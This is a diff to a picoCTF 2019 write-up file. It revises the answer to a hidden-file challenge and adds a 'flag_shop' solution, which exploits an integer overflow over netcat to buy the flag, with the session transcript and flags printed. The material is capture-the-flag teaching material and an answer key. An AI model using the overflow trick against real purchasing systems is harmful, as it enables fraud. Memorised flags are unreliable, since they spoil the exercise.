@@ -156,7 +156,7 @@ Flag:```picoCTF{th3yr3_a5_d1ff3r3nt_4s_bu773r_4nd_j311y_aslkjfdsalkfslkflkjdsfds
 <br>
 Q: I've used a super secret mind trick to hide this file. Maybe something lies in /problems/where-is-the-file_6_8eae99761e71a8a21d3b82ac6cf2a7d0.
 
-A: This question is very simple, the name of the question gives it away that the file is hidden. Run ```ls -la``` and you will see the file. then you can just ```cat``` it.
+A: This question is very simple and must be done from the shell, the name of the question gives it away that the file is hidden. Run ```ls -la``` and you will see the file. then you can just ```cat``` it.
 ```
 $ ls -la
 total 80
@@ -169,3 +169,54 @@ picoCTF{w3ll_that_d1dnt_w0RK_a88d16e4}
 ```
 Flag:```picoCTF{w3ll_that_d1dnt_w0RK_a88d16e4}```
 <br>
+<center><h3>flag_shop</h3></center>
+<br>
+Q: There's a flag shop selling stuff, can you buy a flag? *[Source](/picoctf2019/files/store.c)*. Connect with ```nc 2019shell1.picoctf.com 3967```.
+
+Hint: Two's compliment can do some weird things when numbers get really big!
+
+A: Reading the hint pretty much gives the answer. It tells us that there is an integer overflow in the second option of the program. Taking this information we can easily get the flag by entering ten 1's into the second option.
+```
+# nc 2019shell1.picoctf.com 3967
+Welcome to the flag exchange
+We sell flags
+
+1. Check Account Balance
+
+2. Buy Flags
+
+3. Exit
+
+ Enter a menu selection
+2
+Currently for sale
+1. Defintely not the flag Flag
+2. 1337 Flag
+1
+These knockoff Flags cost 900 each, enter desired quantity
+1111111111
+
+The final cost is: -727380068
+
+Your current balance after transaction: 727381168
+
+Welcome to the flag exchange
+We sell flags
+
+1. Check Account Balance
+
+2. Buy Flags
+
+3. Exit
+
+ Enter a menu selection
+2
+Currently for sale
+1. Defintely not the flag Flag
+2. 1337 Flag
+2
+1337 flags cost 100000 dollars, and we only have 1 in stock
+Enter 1 to buy one1
+YOUR FLAG IS: picoCTF{m0n3y_bag5_cd0ead78}
+```
+Flag:```picoCTF{m0n3y_bag5_cd0ead78}```
